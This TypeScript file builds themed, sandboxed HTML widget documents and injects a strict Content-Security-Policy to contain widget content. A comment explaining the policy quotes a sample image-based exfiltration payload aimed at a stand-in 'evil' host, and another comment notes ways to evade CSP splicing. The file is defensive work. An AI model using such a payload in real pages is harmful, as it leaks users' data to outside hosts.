type WidgetThemeTokenName =
  | "--background"
  | "--foreground"
  | "--card"
  | "--card-foreground"
  | "--muted"
  | "--muted-foreground"
  | "--primary"
  | "--primary-foreground"
  | "--secondary-foreground"
  | "--secondary"
  | "--accent"
  | "--accent-foreground"
  | "--destructive"
  | "--border"
  | "--chart-1"
  | "--chart-2"
  | "--chart-3"
  | "--chart-4"
  | "--chart-5"
  | "--rounded"
  | "--radius"
  | "--shadow-sm"
  | "--shadow-md"


type WidgetThemeTokens = Record<WidgetThemeTokenName, string>


const WIDGET_THEME_TOKEN_NAMES: WidgetThemeTokenName[] = [
  "--background",
  "--foreground",
  "--card",
  "--card-foreground",
  "--muted",
  "--muted-foreground",
  "--primary",
  "--primary-foreground",
  "--secondary-foreground",
  "--secondary",
  "--accent",
  "--accent-foreground",
  "--destructive",
  "--border",
  "--chart-1",
  "--chart-2",
  "--chart-3",
  "--chart-4",
  "--chart-5",
  "--rounded",
  "--radius",
  "--shadow-sm",
  "--shadow-md",
]


const DEFAULT_WIDGET_TOKENS: WidgetThemeTokens = {
  "--background": "#ffffff",
  "--foreground": "#18181b",
  "--card": "#ffffff",
  "--card-foreground": "#18181b",
  "--muted": "#f4f4f5",
  "--muted-foreground": "#71717a",
  "--primary": "#18181b",
  "--primary-foreground": "#fafafa",
  "--secondary-foreground": "#e4e4e7",
  "--secondary": "#18181b",
  "--accent": "#f4f4f5",
  "--accent-foreground": "#18181b",
  "--destructive": "#dc2626",
  "--border": "#e4e4e7",
  "--chart-1": "#f59e0b",
  "--chart-2": "#3b82f6",
  "--chart-3": "#ef4444",
  "--chart-4": "#6366f1",
  "--chart-5": "#ec4899",
  "--rounded": "0.75rem",
  "--radius": "0.75rem",
  "--shadow-sm": "0px 2px 4px 0px rgb(0 0 0 / 0.05), 0px 1px 2px -1px rgb(0 0 0 / 0.05)",
  "--shadow-md": "0px 2px 4px 0px rgb(0 0 0 / 0.05), 0px 2px 4px -1px rgb(0 0 0 / 0.05)",
}


const renderThemeTokenBlock = (tokens: WidgetThemeTokens) =>
  WIDGET_THEME_TOKEN_NAMES.map((name) => `${name}: ${tokens[name]};`).join("\n      ")


const WIDGET_BASE_STYLE = `
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible+Next:ital,wght@0,200..800;1,200..800&family=Inconsolata:wght@200..900&family=Architects+Daughter&display=swap');

    :root {
      ${renderThemeTokenBlock(DEFAULT_WIDGET_TOKENS)}
      --font-sans: "Atkinson Hyperlegible Next", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      --font-handwriting: "Architects Daughter", cursive;
      color-scheme: light dark;
      font-family: var(--font-sans);
    }

    html, body {
      margin: 0;
      padding: 0;
      min-height: 100%;
      width: 100%;
      background: var(--background);
      color: var(--foreground);
    }

    body {
      box-sizing: border-box;
    }

    *, *::before, *::after {
      box-sizing: border-box;
      scrollbar-width: thin;
      scrollbar-color: transparent transparent;
    }

    html:hover, body:hover, *:hover {
      scrollbar-color: rgba(120,120,130,.5) transparent;
    }

    ::-webkit-scrollbar {
      width: 4px;
      height: 4px;
      background: transparent !important;
    }

    ::-webkit-scrollbar-track {
      background: transparent !important;
    }

    ::-webkit-scrollbar-thumb {
      background-color: rgba(120,120,130,.5);
      border-radius: 999px;
      opacity: 0;
      transition: opacity .2s ease, background-color .2s ease;
    }

    html:hover::-webkit-scrollbar-thumb,
    body:hover::-webkit-scrollbar-thumb,
    *:hover::-webkit-scrollbar-thumb {
      opacity: 1;
    }

    html:hover::-webkit-scrollbar-thumb:hover,
    body:hover::-webkit-scrollbar-thumb:hover,
    *:hover::-webkit-scrollbar-thumb:hover {
      background-color: rgba(120,120,130,.7);
    }

    ::-webkit-scrollbar-corner {
      background: transparent !important;
    }
  </style>
`


/**
 * Builds a tiny resize bridge so an iframe can report its content height to the parent.
 */
const buildWidgetResizeScript = (frameId: string) => `
  <script>
    (() => {
      const FRAME_ID = ${JSON.stringify(frameId)}

      const measure = () => {
        const doc = document.documentElement
        const body = document.body
        const height = Math.ceil(Math.max(
          doc ? doc.scrollHeight : 0,
          doc ? doc.offsetHeight : 0,
          body ? body.scrollHeight : 0,
          body ? body.offsetHeight : 0
        ))

        window.parent.postMessage({
          source: "topix-widget-height",
          frameId: FRAME_ID,
          height
        }, "*")
      }

      const scheduleMeasure = () => window.requestAnimationFrame(measure)

      window.addEventListener("load", scheduleMeasure)
      window.addEventListener("resize", scheduleMeasure)

      if ("ResizeObserver" in window) {
        const resizeObserver = new ResizeObserver(scheduleMeasure)
        resizeObserver.observe(document.documentElement)
        if (document.body) {
          resizeObserver.observe(document.body)
        }
      }

      if ("MutationObserver" in window && document.body) {
        const mutationObserver = new MutationObserver(scheduleMeasure)
        mutationObserver.observe(document.body, {
          childList: true,
          subtree: true,
          attributes: true,
          characterData: true,
        })
      }

      scheduleMeasure()
      window.setTimeout(scheduleMeasure, 150)
    })()
  </script>
`


/**
 * Checks whether widget content already contains a full HTML document shell.
 */
export const isFullWidgetDocument = (html: string) => {
  const normalized = html.trim().toLowerCase()
  return normalized.includes("<html") || normalized.includes("<!doctype")
}


/**
 * Extracts inner body markup when the model returns a bare <body> wrapper.
 */
const extractBodyMarkup = (html: string) => {
  const match = html.match(/<body[^>]*>([\s\S]*)<\/body>/i)
  return match?.[1]?.trim() || html
}


/**
 * Extracts external asset tags that should live in the document head.
 */
const extractHeadAssets = (html: string) => {
  const assetPattern = /<(script\b[^>]*\bsrc\s*=\s*["'][^"']+["'][^>]*>\s*<\/script>|link\b[^>]*\brel\s*=\s*["']stylesheet["'][^>]*>)/gi
  const assets = html.match(assetPattern) ?? []
  const bodyMarkup = html.replace(assetPattern, "").trim()

  return {
    assets,
    bodyMarkup,
  }
}


/**
 * Trusted CDN origins a widget may legitimately pull Chart.js / Reveal.js and
 * their assets from. The HTML-widget skill points authors at these; every other
 * origin is denied by the widget CSP below.
 */
const WIDGET_ASSET_ORIGINS = [
  "https://cdn.jsdelivr.net",
  "https://cdnjs.cloudflare.com",
  "https://unpkg.com",
]


/**
 * Content-Security-Policy shipped inside every widget document.
 *
 * Widgets are contractually self-contained (see the html-widget / mini-app
 * skills: "no external dependencies unless truly necessary"; mini-apps have no
 * `fetch`/`eval`/`Function`). This policy enforces that intent in the shipped
 * frontend rather than relying on an external Caddy header:
 *  - `connect-src 'none'` blocks fetch/XHR/WebSocket/beacon exfil;
 *  - script/style/font are pinned to inline + the documented CDN allowlist;
 *  - `img-src` intentionally omits arbitrary `https:` — a remote `<img>` is a
 *    GET-exfil channel (`<img src="https://evil/x?"+data>`) that would undo
 *    `connect-src 'none'`, and remote images aren't part of the contract;
 *  - `'unsafe-eval'` is intentionally absent (mini-apps forbid eval/Function);
 *  - `base-uri`/`form-action`/`frame-src 'none'` block base-hijack + phishing.
 * `media-src data: blob:` allows inline (non-remote) audio/video.
 */
const WIDGET_CSP = [
  "default-src 'none'",
  `script-src 'unsafe-inline' ${WIDGET_ASSET_ORIGINS.join(" ")}`,
  `style-src 'unsafe-inline' https://fonts.googleapis.com ${WIDGET_ASSET_ORIGINS.join(" ")}`,
  `img-src data: blob: ${WIDGET_ASSET_ORIGINS.join(" ")}`,
  `font-src data: https://fonts.gstatic.com ${WIDGET_ASSET_ORIGINS.join(" ")}`,
  "media-src data: blob:",
  "connect-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
  "frame-src 'none'",
].join("; ")


const WIDGET_CSP_META = `<meta http-equiv="Content-Security-Policy" content="${WIDGET_CSP}" />`


/**
 * Inject the widget CSP as the parser's FIRST head child so it governs every
 * asset the document then loads. Uses a real HTML parser (not text splicing):
 * regex splicing keyed to a `<head>` token is evadable — a `<head>` hidden in a
 * comment makes the meta inert, and a resource appearing before `<head>` in
 * source is hoisted ahead of a spliced meta. Parsing normalizes both: the
 * comment stays a comment and `head.prepend` puts the meta before any hoisted
 * resource. Browsers enforce the intersection of all delivered policies, so this
 * can only tighten an author-supplied CSP.
 */
const injectWidgetCsp = (html: string): string => {
  const doc = new DOMParser().parseFromString(html, "text/html")
  const meta = doc.createElement("meta")
  meta.setAttribute("http-equiv", "Content-Security-Policy")
  meta.setAttribute("content", WIDGET_CSP)
  doc.head.prepend(meta) // first-in-head, ahead of any parser-hoisted resource
  const doctype = doc.doctype ? `<!DOCTYPE ${doc.doctype.name}>\n` : ""
  return doctype + doc.documentElement.outerHTML
}


/**
 * Reads the current app theme tokens so widgets stay aligned with the active theme.
 */
export const getWidgetThemeTokens = (): WidgetThemeTokens => {
  if (typeof window === "undefined") {
    return DEFAULT_WIDGET_TOKENS
  }

  const styles = getComputedStyle(document.documentElement)

  const tokens = WIDGET_THEME_TOKEN_NAMES.reduce<WidgetThemeTokens>((acc, name) => {
    const value = styles.getPropertyValue(name).trim()
    acc[name] = value || DEFAULT_WIDGET_TOKENS[name]
    return acc
  }, { ...DEFAULT_WIDGET_TOKENS })

  if (!tokens["--rounded"]) {
    tokens["--rounded"] = tokens["--radius"] || DEFAULT_WIDGET_TOKENS["--rounded"]
  }

  return tokens
}


/**
 * Wraps body-only widget markup in a themed standalone HTML document.
 */
export const buildWidgetDocument = (
  html: string,
  title = "Widget",
  options?: {
    autoHeightFrameId?: string
  }
) => {
  if (isFullWidgetDocument(html)) {
    return injectWidgetCsp(html)
  }

  const { assets, bodyMarkup } = extractHeadAssets(extractBodyMarkup(html))
  const tokens = getWidgetThemeTokens()
  const tokenStyle = renderThemeTokenBlock(tokens)
  const escapedTitle = title
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
  const resizeScript = options?.autoHeightFrameId
    ? buildWidgetResizeScript(options.autoHeightFrameId)
    : ""

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    ${WIDGET_CSP_META}
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>${escapedTitle}</title>
    ${WIDGET_BASE_STYLE.replace(
      renderThemeTokenBlock(DEFAULT_WIDGET_TOKENS),
      tokenStyle
    )}
    ${assets.join("\n    ")}
  </head>
  <body>
    ${bodyMarkup}
    ${resizeScript}
  </body>
</html>`
}
